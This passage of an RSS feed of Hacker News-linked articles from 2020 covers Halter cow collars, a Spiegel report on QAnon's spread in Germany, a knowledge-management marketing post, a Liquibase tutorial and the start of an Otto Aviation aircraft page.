process is continually being modified and improved.</p><p>To date we haven‚Äôt come across any cows that we couldn‚Äôt train! Some learn faster than others but due to the fact that cows are herd animals, the slower ones tend to follow and learn from the faster cows.</p><p><strong>How do you ensure that the training is safe and ethical?</strong></p><p>We‚Äôve been working with animal ethics committees from the start and continue to work closely with them, along with vets and professors in this domain. Welfare is our top priority and our founding vision is to unlock the connection between animals and humans to create a better world, with the hope of not only improving the welfare of cows but other animals in the future. </p><p>We are employing a number of systems to ensure our technology is never harmful to a cow, for instance we have hardcoded mechanisms in place that will shut down a collar should anything out of the ordinary happen, for example a cow getting spooked. We have also considered the training process itself and will begin training softly until a cow becomes more comfortable. </p><p>We want to dramatically improve the welfare of cows and will never compromise their wellbeing.</p><p><strong>Will Halter work on other livestock like sheep and beef cattle? And what about calves?</strong></p><p>Absolutely. Beef cattle would be simple - it just requires a slight change in use case. Sheep would require a collar redesign to fit their small fluffy necks and, no, they are not too stupid! I am confident that the fundamental techniques will work on pretty much any mammal. Pavlovian conditioning is a concept that appeals to very basic animalistic instincts that all mammals, and most likely many other types of animals share.</p><p>In terms of calves there is no reason that Halter wouldn‚Äôt work for them, we‚Äôd just need collars small enough! Although we are currently focused on dairy cattle I see no reason why Halter wouldn‚Äôt work on other livestock in the future!</p><p>Setting up a virtual break fence, shifting cows automatically or drafting a single cow with the touch of a button sounds like a rather crazy concept, but we hope this has given you a touch of background and understanding to it all. We‚Äôll leave you to train your dogs, but trust us when we say - we‚Äôve got the cows covered.</p></div></div></div>]]>
            </description>
            <link>https://halterhq.com/smart-cow-collars</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577468</guid>
            <pubDate>Thu, 24 Sep 2020 11:20:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Most Dangerous Cult of Our Times: QAnon's Inexorable Spread Beyond the U.S.]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24577419">thread link</a>) | @nabla9
<br/>
September 24, 2020 | https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="true">


</section>
<section>
<div>
<p>The path into the parallel world follows rural roads snaking through the hills of Baden-Wurttemberg to a house located on the edge of a village with a bright white fa√ßade, well-swept driveway and carefully trimmed lawn. The conspiracy has long since eaten its way into the southern German idyll. A friendly man opens the door - muscular, burly, he does a lot of lifting.</p>


<div>
<p>It was not easy to set up a meeting. He has a deep aversion to journalists and other members of a supposed elite, whom he believes are covering up a worldwide plot to oppress humanity. Over the phone, he said that he hopes to open the reporter‚Äôs eyes. "Maybe I can wake you up.‚Äù He requested that his real name not be used, so we'll call him Martin Schmidt.</p><p>"The goal of the elites is to stay powerful, to stay rich and to enslave the world,‚Äù he says.</p><p>Schmidt is 27, works as an electrician and has been living with his parents again since the beginning of the pandemic. He leads the way into the living room, with its bright tile floor and woodchip wallpaper, and says he has been thinking about the big questions for a long time. The death of John F. Kennedy, the attacks of September 11, the coronavirus pandemic: He believes they have all been faked as part of a giant plan.</p>
</div>

<p>His father nods next to him. He also believes people are being systematically deceived by politicians and members of the media. Schmidt says: "This elite, they are various men and women who work on Wall Street, to whom the banks belong, all these people.‚Äù He believes businesspeople like George Soros, Bill Gates and Mark Zuckerberg are among them, as well as the Rockefellers and the Rothschilds.</p>

<section data-area="contentbox">
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;996d8f55-bef6-471b-ad10-5c788bf27a9e&quot;, &quot;zoomable&quot;:false,&quot;zoomId&quot;:&quot;e7a12de2-75d3-4553-8079-734b91d3afd9&quot;}">
<span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg" srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w" width="568" height="750" sizes="568px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w">
</span>
</span>
</span>
</figure>

</div>
</section>
<p>He takes out his smartphone. "I‚Äôll show you how the rich and beautiful party.‚Äù He shows a photo of performance artist Marina Abramoviƒá&nbsp;with the singer Lady Gaga at a charity event. In the picture, they are standing next to a naked female body covered with a red liquid. For Schmidt, the photo is proof of how morally degenerate the leaders of society have become, and that even the so-called elite aren‚Äôt afraid of killing people - even if, in this case, the photo is of an art performance. He says the situation is alarming. "I have awoken.‚Äù</p>

<p>Martin Schmidt is part of a growing number of QAnon sympathizers, one of tens of thousands in Germany. Followers of this right-wing conspiracy theory are convinced that an influential group of Satanist pedophiles is kidnapping boys and girls and using their blood to produce a drug. They believe that the coronavirus was developed in a Chinese lab ‚Äì possibly with the help of Barack Obama ‚Äì in order to hurt Donald Trump and prevent his reelection, a claim that is as absurd as it is false. And they believe Donald Trump is a hero fighting against the "deep state,‚Äù and that he wants to protect the world from the demonic group.</p>

<p>"He is trying to save humanity,‚Äù says Schmidt. "He will take away the elites‚Äô power.‚Äù</p>
<div>
<p>One could dismiss QAnon as crazed paranoia, like the false claims that the moon landing was faked or that the attacks of September 11th were planned by the U.S. government. But what makes the movement unique and, especially, dangerous, is its ideas.</p><p>QAnon‚Äôs followers spread disturbingly familiar themes: a supposed conspiracy of rich elites, including many Jewish businesspeople, targeting the rest of the world; a supposed group of corrupt left-wing politicians infiltrating democracies; journalists who spread propaganda as accomplices to the powerful. These centuries-old fictions from the right-wing, anti-Semitic fringe have been spread into the international public sphere via 21st-century media - part Dreyfus Affair, part Dan Brown.</p><p>"It is no exaggeration to view QAnon as a potential threat to national security,‚Äù says extremism researcher Julia Ebner from the London-based think tank Institute for Strategic Dialogue. Ebner has been researching online radicalization for years and is watching with concern as the German Q movement is becoming more independent and itself trying to recruit new followers.</p><p>Indeed, QAnon is on its way to becoming the most dangerous cult in the world ‚Äì the first ideology to come from the digital realm and to emerge from an online niche into real life, aided by Donald Trump-supporters and right-wing demagogues. The "Q‚Äù cult is fueled by one or several anonymous users who regularly post to the web and who claim to have access to top-secret U.S. government documents ‚Äì a claim that is more than questionable.</p><p>Just as disturbing is how QAnon builds on age-old anti-Semitic conspiracy theories that, centuries ago, claimed Jews drink the blood of Christians and seek to control the world. At the same time, the movement‚Äôs potential for violence is also becoming clearer. In March 2019, a QAnon believer shot an alleged mafia boss in New York because he believed the man was a member of the "deep state.‚Äù In April, U.S. police officers took a woman into custody who had threatened Hillary Clinton on Facebook because she had allegedly abused a child. In 2018, a man in Florida sent mail bombs to prominent Democrats whom he believed to be members of a "deep state" conspiracy.</p><p>The gunman in the central German city of Hanau who killed 10 people and then himself in February alluded to topics circulating in the QAnon cosmos. In a YouTube video, he argued that there were subterranean military installations in the U.S. where children are abused and killed and where the devil is worshipped.</p><p>QAnon followers also played a role in the storming of the Reichstag, the seat of German parliament, in Berlin in late August by a group protesting the authorities‚Äô measures to control COVID-19. Naturopath Tamara Kirschbaum, who called on people to run up the building‚Äôs stairs to the entrance, is identified online as a "freelance employee‚Äù of Qlobal-Change, a portal of QAnon followers. She describes herself as "the voice‚Äù of the "X22 Report,‚Äù a YouTube show about QAnon-related topics that is also translated into German. The Office for the Protection of the Constitution, the German domestic intelligence agency, in the western German state of North Rhine-Westphalia classifies her as a member of the Reichsb√ºrger (or "citizens of the Reich‚Äù) scene, a group that does not believe in the legitimacy of the modern German state.</p><p>Large U.S. tech companies have played a decisive role in the dissemination of the ideology. QAnon would not have been able to spread as fast and far around the world without YouTube, Facebook, Twitter and other social networks. During the coronavirus pandemic and in the first lockdowns in February, the ideology spread even more rapidly, especially in Germany. QAnon has been like a second virus spreading around the world, but this one is very definitely man-made.</p>
</div>

<div>
<p>It is no accident that Trump‚Äôs campaign team has recognized QAnon disciples as an important part of his base and is catering to them. Indeed, several Republican candidates for Congress have professed their affiliation to the movement.</p><p>The QAnon ideology, the first to emerge in the 21st century, is like a blend of video game and online treasure hunt, and emerged on a rather noxious platform that caters largely to young men: 4chan, a simple web forum that was founded in 2003 by a 15-year-old programmer from New York.</p><p><strong>4chan is essentially</strong> a giant digital pinboard with virtually no oversight. Anyone can write and post pretty much anything they want, always anonymously. Only very few things are not allowed and are then deleted. Its offerings include hardcore pornography, as well as tasteless, insulting or right-wing extremist speech. It has given birth to both good and repulsive ideas, which are then commented on and discussed - before immediately being overwhelmed by new posts and ideas.</p><p>4chan‚Äôs roots are in the Japanese manga scene. First-time visitors to the platform will struggle to make sense of its hundreds of discussion groups, manga photos and inside jokes. There are hundreds of thousands of entries every day, supposedly 27 million visitors per month. A unique language has emerged almost without any oversight that, like the jokes, is incomprehensible to outsiders. Thus far, there have been 3.5 billion entries. Users are bound together by the belief that they are part of one of the last bastions of free speech and opinion.</p><p>On October 28, 2017, an anonymous user on 4chan posted the following message: "Hillary Clinton will be arrested between 7:45 AM ‚Äì 8:30 AM EST on Monday ‚Äì the morning of Oct 30, 2017." The author signed later entries with the letter "Q.‚Äù It was the movement's Big Bang, launched by a false prediction. Clinton wasn‚Äôt arrested on October 30th, nor has she been arrested since, but the curiosity of users was piqued.</p><p>Author and conspiracy-theory researcher Timothy Melley at the University of Miami says many Americans are familiar with the elements of the QAnon movement. "It is like a detective novel, where you always inch closer to the truth.‚Äù Q has been posting increasingly complex entries since fall 2017, called "drops‚Äù by followers. These entries contain so-called "breadcrumbs‚Äù that must be followed to reach the goal. Which is ultimately unattainable.</p><p>Q‚Äôs breadcrumbs are like seeds, out of which the stories about the alleged elite conspiracy grow almost by themselves. Q is asking his or her (or their) followers to do their own research if they do not believe the media, turning conspiracy theorists into investigators. Melley argues that the desire to be a part of a revelation keeps them going, even if they never prove anything, and merely keep finding new breadcrumbs.</p>
</div>
<section>
<div data-component="HTMLEmbed">

<p>Illustration: Iris Kuhlmann / DER SPIEGEL; Fotos: Getty Images (3); klaput.blogspot.com; Twitter; wilkowmajority.com; YouTube.</p>
</div>
</section>
<div>
<p>The participatory nature of the ideology is what makes it so attractive. Melley argues that QAnon blends two big conspiracy theories together: a belief that the Illuminati, or someone else, rules the world and that there is a "deep state‚Äù within the government that is ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170">https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577419</guid>
            <pubDate>Thu, 24 Sep 2020 11:13:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Knowledge Management System ‚Äì KMS Ultimate Guide with Examples]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577401">thread link</a>) | @robins73
<br/>
September 24, 2020 | https://www.due.work/blog/knowledge-management-system-kms-ultimate-guide-with-examples/ | <a href="https://web.archive.org/web/*/https://www.due.work/blog/knowledge-management-system-kms-ultimate-guide-with-examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <!--kg-card-begin: image--><figure><img src="https://images.unsplash.com/photo-1504292004442-f285299403fa?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="It is sometimes a good idea to stay at home and work. Not always, but when it happens to have ‚Äòthis day‚Äô, you just can resist. And that‚Äôs totally fine."><figcaption>Photo by <a href="https://unsplash.com/@kundeleknabiegunie?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Agnieszka Boeske</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><!--kg-card-end: image--><p>Today, I will talk about knowledge management systems and its role in an organization. </p><p>First I will make you familiar with some basic concept of knowledge management and then I will jump right into how you can build an effective kms knowledge management system for your business or organization.</p><h2 id="what-is-knowledge-management-and-why-it-is-important">What is knowledge management and why it is important?</h2><p><strong>Knowledge management (KM)</strong> is a process of creating, using and &nbsp;sharing knowledge and information of an organization. </p><p>With a better Knowledge management you can provide a better customer support and answer customers‚Äô questions in real time, as they‚Äôre struggling with their challenges, instead of constantly answering the same questions in your support ticketing system.</p><h3 id="why-use-a-knowledge-management-system">Why use a knowledge management system?</h3><p>In an <strong>Organization</strong>, we often need to share knowledge and informations like documentation, frequently asked questions and other informations for both internal and external customers and to manage all that we need a better knowledge management system.</p><h2 id="what-are-the-two-major-types-of-knowledge-management-systems">What are the two major types of knowledge management systems?</h2><ol><li>Explicit Knowledge </li><li>Tacit Knowledge</li></ol><p>In a KM system, <strong>Explicit knowledge</strong> (also expressive knowledge) is knowledge that can be easily, codified, stored and accessed. It can be easily transmitted to others.</p><p><strong>Tacit knowledge</strong> is the kind of knowledge that is difficult to transfer to another person by means of writing it down or verbalizing it. </p><h3 id="benefits-of-a-kms">Benefits of a KMS</h3><p>Building a knowledge management system or kms system can help you</p><ul><li>Decrease support costs</li><li>Increase customer happiness</li><li>Improve the overall customer experience and customer success ROI</li></ul><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><h2 id="building-an-effective-knowledge-management-system-in-organization">Building an Effective Knowledge Management System in Organization</h2><!--kg-card-begin: image--><figure><img src="https://images.unsplash.com/photo-1557804506-669a67965ba0?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="This photo is free for public use. ‚ù§Ô∏è If you do use this photo, Please credit in caption or metadata with link to &quot;www.useproof.com&quot;. "><figcaption>Photo by <a href="https://unsplash.com/@austindistel?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Austin Distel</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><!--kg-card-end: image--><p>When we work in an organization, &nbsp;we &nbsp;have to deal with lots of support tickets to manage and a role of knowledge management system tools can be a game changer to help your customer succeed.</p><blockquote><a href="https://www.due.work/knowledge-base">Due.Work</a> is one such example of a knowledge base software and is suitable for both internal and external teams and it has been designed to help you scale your customer support and collaborate better with your team.</blockquote><p><strong>Choosing a knowledge management software</strong><br>There are many KMSs out there of which each should have these characteristics features.</p><ol><li>Knowledge base</li><li>Forums/Customer Feedback/Community</li><li>FAQs</li><li>Case studies</li><li>How-to articles and tutorials</li><li>Resources</li><li>Live Chat<br></li></ol><blockquote>Let's find out some companies that use knowledge management systems. </blockquote><h2 id="knowledge-management-systems-examples-">Knowledge Management Systems Examples. </h2><div><p>I will look for two main examples of knowledge management system to explain how you can organize your knowledge management system.</p><p><strong>Due.work Knowledge Base</strong></p></div><!--kg-card-begin: image--><figure><img src="https://www.due.work/blog/content/images/2020/09/Standalone@2x.png"><figcaption><a href="https://help.due.work/">Source</a></figcaption></figure><!--kg-card-end: image--><p>Here, is a<strong> </strong>centralised<strong> Search Engine</strong> connected with all the support tools like etc which will help user search specific solutions and jump right to it.</p><p>Knowledge Base in Due.work's Help Center is arranged together with several support tools like:</p><ul><li><strong>User guides</strong> - Contains all the basic help like FAQs, How-to articles, Common Issues etc.</li><li><strong>Roadmap - </strong>It contains knowledge related to all the features, future planning of the product that is going to be implement in future versions and users can discuss over it.</li><li><strong>Customer feedback</strong> - Contains feature requests, Bug reports</li><li><strong>Community forums</strong> - Platform where users can share ideas together, discuss and find solutions</li><li><strong>Live chat</strong></li><li><strong>Whats new/News/Announcements</strong></li></ul><h3 id="fullstory-knowledge-base">FullStory Knowledge Base</h3><p>Another knowledge management system example is from FullStory. It also includes articles that address common customer support issues, Training Webinars, Developer Guides and all with a common search.</p><!--kg-card-begin: image--><figure><img src="https://www.due.work/blog/content/images/2020/09/Screenshot-2020-09-24-at-12.30.20-PM-1.png"><figcaption><a href="https://help.fullstory.com/hc/en-us">source</a></figcaption></figure><!--kg-card-end: image--><h3 id="developing-a-knowledge-management-system">Developing a Knowledge Management System</h3><p>Before developing you should first look out for the best knowledge base tools to manage your information. </p><p>Modern knowledge management systems like <a href="https://www.due.work/knowledge-base">Due.work</a> are built for ease of use and is well suitable for global teams. They offer functionality to make it easy to customize the look and feel of your knowledge base, and to improve your content over time. </p><div><p><strong>Choosing a knowledge management software</strong><br>While choosing a perfect km system there are various things we should look our for like What type of support do you offer?</p><p>Let‚Äôs take a closer look at some of the must needed features of a knowledge management system:</p></div><ol><li>Ease of use with Rich text editing and multimedia</li><li>Search Engine Optimization (SEO)</li><li>Reporting and analytics</li><li>Feedback collection</li><li>Multi-language support</li><li>In-build live chat solution</li><li>Customer feedback and Community Support</li><li>Cost</li></ol><blockquote>A knowledge base should act as self-service support apart from having a great content. It should actively help users find answers.</blockquote><h2 id="conclusion">Conclusion</h2><p><strong>Role of knowledge management in organization </strong>is very important with a better tool your team will be able to collaborate more effectively and customers will be more loyal.</p><p>A Knowledge Management System is an essential part of your strategy to drive business growth.</p><p><a href="https://www.due.work/knowledge-base">Due.work</a> is one such tools which provide all those features helps your business to communicate better, and scale your customer support. <strong><a href="https://www.due.work/knowledge-base">Try Due.Work Knowledge Base</a></strong></p><!--kg-card-begin: image--><figure><img src="https://www.due.work/blog/content/images/2020/09/120040267_746241386224500_3974929633963811446_o.png"><figcaption><a href="https://www.due.work/knowledge-base">Due.work - All in one customer support and engagement</a></figcaption></figure><!--kg-card-end: image--><!--kg-card-begin: html--><!--kg-card-end: html-->
                </div>
            </section>



            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.due.work/blog/knowledge-management-system-kms-ultimate-guide-with-examples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577401</guid>
            <pubDate>Thu, 24 Sep 2020 11:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Database Version Control with Liquibase]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 79 (<a href="https://news.ycombinator.com/item?id=24577239">thread link</a>) | @asafg6
<br/>
September 24, 2020 | https://www.turtle-techies.com/database-version-controler-with-liquibase/ | <a href="https://web.archive.org/web/*/https://www.turtle-techies.com/database-version-controler-with-liquibase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
        
        <h4>Introduction to managing DB shcema changes with Liquibase</h4>
                <h6>
                    By Suresh Regmi, Published 2020-09-06
                </h6>
    </p><div itemprop="articleBody"><h2 id="motivation">Motivation</h2>
<p>Let me give you a scenario,<br>
You have a project with multiple database instances in different environments (Dev, QA, Production) and you need to manage the database schema changes that are done against those environments.
Let‚Äôs assume that you are managing those changes by creating a git project or a shared file on a drive and adding a new SQL file for each database changes you are doing.
To implement your changes in that database, for each SQL file, you need to run the changes in each environment manually and add a flag or note to indicate which change is run on which environment.<br>
Would it be able to complete your task?
Yes, Yet, is it a decent method to manage schema changes?<br>
Of Course Not.</p>
<h2 id="here-are-some-of-the-many-problems-you-might-face-while-doing-so">Here are some of the many problems you might face while doing so</h2>
<ol>
<li>Hard to synchronize database and application code changes in different environments</li>
<li>The tedious process to run each change manually in different environments</li>
<li>Collaboration across the development team on what change is deployed and what is not</li>
<li>Hard to roll-back to the previous version of the database</li>
<li>Possibility of data loss</li>
</ol>
<h2 id="here-comes-liquibase">Here comes Liquibase</h2>
<p>Liquibase is an open-source library for tracking and managing database schema changes that can be used for any database with a JDBC driver.<br>
It is a platform-independent database migration tool that allows the database changes referred to as ‚Äòchangesets‚Äô to be written in various formats including XML, JSON, YAML, and SQL.</p>
<h2 id="features">Features</h2>
<ol>
<li>Supports almost all databases that have a JDBC driver.</li>
<li>Changesets can be written in different formats like XML, JSON, YAML, and SQL.</li>
<li>Can be used to automatically generate changesets for an existing database</li>
<li>Easy to integrate with build tools like Jenkins, Maven etc</li>
<li>Supports database rollbacks</li>
<li>Supports context-dependent logic allowing us to use global context and preconditions</li>
<li>Can be executed via command line, Apache Maven, Apache Ant, Spring Framework</li>
<li>Has feature to generate changeset from an existing database and can also generate schema difference as changesets</li>
</ol>
<h2 id="different-ways-to-run-liquibase">Different ways to run liquibase</h2>
<ol>
<li><strong>Embed liquibase with your app:</strong> Embedding liquibase with your application code will automatically deploy liquibase on the app startup.</li>
<li><strong>Run liquibase using build tools:</strong> Integrate liquibase into your build process (with build tools like Jenkins, Ant, Maven, and Gradle) and update them without being tied up with the application.</li>
<li><strong>Generate the SQL and run it manually:</strong> Using update SQL, Liquibase provides the SQL generated from the changeset along with the database changes required to keep the tracking tables up to date. DBA will then inspect the SQL and run them against the database.</li>
</ol>
<h2 id="installation-process">Installation Process</h2>
<p><strong>Prerequisites:</strong> Liquibase requires Java 8+</p>
<p>There are two ways to install Liquibase, Manual installation and using liquibase installer.</p>
<p>If you set up liquibase using the liquibase installer, dependencies, directories, config and properties files will all be in place already.
It also provides some examples which will provide you with the core concepts required to understand the changesets.</p>
<p>In the case of manual installation, you need to download the compressed liquibase file and extract it in your workspace.<br>
For windows users, you need to add a new <code>PATH</code> variable in the <code>Environment Variables</code>.<br>
For macOS users, the path should be added to the <code>bash.profile</code> file.</p>
<p>For detailed instruction on Installation please follow this <a href="https://docs.liquibase.com/concepts/installation/home.html" target="_blank"> document </a>.</p>
<h2 id="core-concepts">Core Concepts</h2>
<ol>
<li><strong>liquibase.properties:</strong> The file <code>liquibase.properties</code> is a text-based file that stores common properties like database connection parameters, driver details, classpath parameters, global changelog parameters etc.
If you install liquibase using liquibase installer, it will provide pre-written <code>liquibase.properties</code> file while in case of manual installation, you need to create <code>liquibase.properties</code> file using a sample file provided.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image01.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image01.png" alt="Sample liquibase.properties file for Oracle"></a></p>
<ol start="2">
<li><strong>DatabaseChangeLog:</strong> Databasechangelog is a file where all changesets go. Each database changelog can include one or more changesets.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image02.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image02.png" alt="Example of an empty DatabaseChangeLog file
"></a></p>
<ol start="3">
<li><strong>Changeset:</strong> In liquibase, a changeset is represented as an atomic change to the database. Each changeset should be uniquely identified using author and id fields.
The database handles each changeset as a single transaction.
Changesets can be written in JSON, XML, SQL and YAML formats.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image03.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image03.png" alt="Example of a changeset in XML format"></a></p>
<ol start="4">
<li><strong>DATABASECHANGELOG &amp; DATABASECHANGELOGLOCK:</strong> These two tables are created by liquibase to track the changes that are run against the database and to make sure that no other migrations age going on.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image04.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image04.png" alt="DATABASECHANGELOG table structure"></a></p>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image05.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image05.png" alt="DATABASECHANGELOGLOCK table structure"></a></p>
<h2 id="what-if-i-dont-like-liquibase">What if I don‚Äôt like Liquibase?</h2>
<p>If you told me that you don‚Äôt like liquibase and are looking for alternatives, I would ask why not Liquibase first.<br>
Liquibase is a sophisticated tool for database migration that has all features that you need for professional database refactoring and versioning.</p>
<p>But still, if you don‚Äôt want to use liquibase, here are some alternatives.</p>
<ol>
<li>
<p><strong>Flyway:</strong> Flyway is an open-source Apache licenced tool for database migration where you can write migrations in database-specific SQL or using Java code. For more details on Flyway, you can refer to this website. <a href="https://flywaydb.org/">https://flywaydb.org/</a></p>
</li>
<li>
<p><strong>YUNIQL:</strong> YUNIQL is also an open-source schema versioning and database migration engine that uses plain SQL scripts which can be integrated with CI/CD pipelines. If you want to check out YUNIQL, you can refer to this website. <a href="https://yuniql.io/">https://yuniql.io/</a></p>
</li>
</ol>
</div></div>]]>
            </description>
            <link>https://www.turtle-techies.com/database-version-controler-with-liquibase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577239</guid>
            <pubDate>Thu, 24 Sep 2020 10:43:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Otto Aviation Celera 500L]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577235">thread link</a>) | @sschueller
<br/>
September 24, 2020 | https://www.ottoaviation.com/celera-500l | <a href="https://web.archive.org/web/*/https://www.ottoaviation.com/celera-500l">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div data-controller="HeaderOverlay">

        

        <div>
          

          <main data-collection-id="5f35b58c60ec1a5bfec27cde" data-controller="IndexFirstSectionHeight, Parallax, IndexNavigation">
            
              

    

  

    

      <section id="new-page-4" data-collection-id="5f35bdefb39b853fd30d9222" data-parallax-id="5f35bdefb39b853fd30d9222" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598484123222" id="page-5f35bdefb39b853fd30d9222"><div><div><div data-block-type="23" id="block-yui_3_17_2_1_1597418134173_12402"><p><h2>
  <center><strong><span> It started with an idea of <br>
what air travel could be.</span></strong></center>
</h2></p></div><div data-block-type="2" id="block-yui_3_17_2_1_1597512042385_13210"><p>Imagine the convenience of private air transportation but at a significantly lower cost and a dramatically reduced carbon footprint. The Celera 500L allows this to become a reality and is being called the most significant innovation for private air transportation in decades. <strong>Here‚Äôs why:</strong></p></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_32083"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500410453-YIEANJ86RXXKMPU0AWOS/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500410453-YIEANJ86RXXKMPU0AWOS/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5.png" data-load="false" data-image-id="5f37ebfa7b61860287b3fe0d" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500410453-YIEANJ86RXXKMPU0AWOS/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_11270"><div><h3>18‚Äì25 mpg fuel economy </h3><p>(a comparable jet aircraft gets 2 ‚Äì 3 mpg)</p></div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_33602"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
